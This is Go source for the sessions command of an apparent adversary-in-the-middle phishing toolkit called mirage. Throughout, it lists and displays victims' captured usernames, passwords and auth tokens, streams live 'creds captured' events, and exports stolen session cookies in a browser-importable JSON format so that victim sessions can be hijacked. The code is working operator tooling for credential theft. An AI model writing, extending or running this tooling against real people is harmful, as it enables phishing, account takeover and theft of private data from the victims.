package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/spf13/cobra"
	"github.com/travisbale/mirage/sdk"
)

func newSessionsCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "sessions",
		Short: "Manage captured sessions",
	}
	cmd.AddCommand(
		newSessionsListCmd(),
		newSessionsShowCmd(),
		newSessionsExportCmd(),
		newSessionsDeleteCmd(),
		newSessionsStreamCmd(),
	)
	return cmd
}

func newSessionsListCmd() *cobra.Command {
	var (
		phishlet  string
		completed bool
		since     string
	)
	cmd := &cobra.Command{
		Use:   "list",
		Short: "List captured sessions",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}

			filter := sdk.SessionFilter{Phishlet: phishlet}
			if cmd.Flags().Changed("completed") {
				filter.Completed = &completed
			}
			if since != "" {
				d, err := parseDuration(since)
				if err != nil {
					return fmt.Errorf("--since: %w", err)
				}
				t := time.Now().Add(-d)
				filter.Since = &t
			}

			resp, err := client.ListSessions(filter)
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(resp)
			}
			if len(resp.Items) == 0 {
				fmt.Println("No sessions found.")
				return nil
			}
			rows := make([][]string, len(resp.Items))
			for i := range resp.Items {
				rows[i] = []string{
					resp.Items[i].ID,
					resp.Items[i].Phishlet,
					resp.Items[i].RemoteAddr,
					resp.Items[i].Username,
					fmtTime(resp.Items[i].StartedAt),
					fmtBool(resp.Items[i].CompletedAt != nil),
				}
			}
			printTable([]string{"ID", "PHISHLET", "REMOTE ADDR", "USERNAME", "STARTED", "DONE"}, rows)
			return nil
		},
	}
	cmd.Flags().StringVar(&phishlet, "phishlet", "", "filter by phishlet name")
	cmd.Flags().BoolVar(&completed, "completed", false, "filter by completion status")
	cmd.Flags().StringVar(&since, "since", "", "show sessions started within duration (e.g. 24h, 7d)")
	return cmd
}

func newSessionsShowCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "show <id>",
		Short: "Show session details",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			s, err := client.GetSession(args[0])
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(s)
			}
			fmt.Printf("ID:          %s\n", s.ID)
			fmt.Printf("Phishlet:    %s\n", s.Phishlet)
			fmt.Printf("Lure ID:     %s\n", s.LureID)
			fmt.Printf("Remote Addr: %s\n", s.RemoteAddr)
			fmt.Printf("User Agent:  %s\n", s.UserAgent)
			fmt.Printf("JA4 Hash:    %s\n", s.JA4Hash)
			fmt.Printf("Bot Score:   %.2f\n", s.BotScore)
			fmt.Printf("Username:    %s\n", s.Username)
			fmt.Printf("Password:    %s\n", s.Password)
			for name, value := range s.Custom {
				fmt.Printf("Custom [%s]: %s\n", name, value)
			}
			fmt.Printf("Started:     %s\n", fmtTime(s.StartedAt))
			fmt.Printf("Completed:   %s\n", fmtOptTime(s.CompletedAt))
			fmt.Printf("Cookies:     %d domain(s)\n", len(s.CookieTokens))
			for name, value := range s.BodyTokens {
				fmt.Printf("Body [%s]:   %s\n", name, value)
			}
			for name, value := range s.HTTPTokens {
				fmt.Printf("Header [%s]: %s\n", name, value)
			}
			return nil
		},
	}
}

func newSessionsExportCmd() *cobra.Command {
	var outFile string
	cmd := &cobra.Command{
		Use:   "export <id>",
		Short: "Export session cookies as JSON (StorageAce format)",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			data, err := client.ExportSessionCookies(args[0])
			if err != nil {
				return err
			}
			if outFile != "" {
				if err := os.WriteFile(outFile, data, 0600); err != nil {
					return fmt.Errorf("writing output file: %w", err)
				}
				fmt.Printf("Cookies written to %s\n", outFile)
				return nil
			}
			_, err = os.Stdout.Write(data)
			return err
		},
	}
	cmd.Flags().StringVar(&outFile, "out", "", "write output to file instead of stdout")
	return cmd
}

func newSessionsDeleteCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "delete <id>",
		Short: "Delete a session",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			if err := client.DeleteSession(args[0]); err != nil {
				return err
			}
			fmt.Printf("Deleted session %s\n", args[0])
			return nil
		},
	}
}

func newSessionsStreamCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "stream",
		Short: "Stream session lifecycle events",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			ch, cancel, err := client.StreamSessions()
			if err != nil {
				return err
			}
			defer cancel()

			fmt.Fprintln(os.Stderr, "Streaming session events. Press Ctrl-C to stop.")

			sig := make(chan os.Signal, 1)
			signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
			defer signal.Stop(sig)

			for {
				select {
				case ev, ok := <-ch:
					if !ok {
						return nil
					}
					s := ev.Session
					fmt.Printf("[%s] %-18s %s  %s  %s\n",
						time.Now().Format("15:04:05"),
						eventLabel(ev.Type),
						s.ID,
						s.Phishlet,
						s.RemoteAddr,
					)
				case <-sig:
					return nil
				}
			}
		},
	}
}

func eventLabel(eventType sdk.EventType) string {
	switch eventType {
	case sdk.EventSessionCreated:
		return "NEW SESSION"
	case sdk.EventCredsCaptured:
		return "CREDS CAPTURED"
	case sdk.EventTokensCaptured:
		return "TOKENS CAPTURED"
	case sdk.EventSessionCompleted:
		return "SESSION COMPLETE"
	default:
		return "SESSION UPDATE"
	}
}

// parseDuration extends time.ParseDuration to support a "d" suffix for days.
func parseDuration(s string) (time.Duration, error) {
	if len(s) > 1 && s[len(s)-1] == 'd' {
		days, err := time.ParseDuration(s[:len(s)-1] + "h")
		if err != nil {
			return 0, err
		}
		return days * 24, nil
	}
	return time.ParseDuration(s)
}
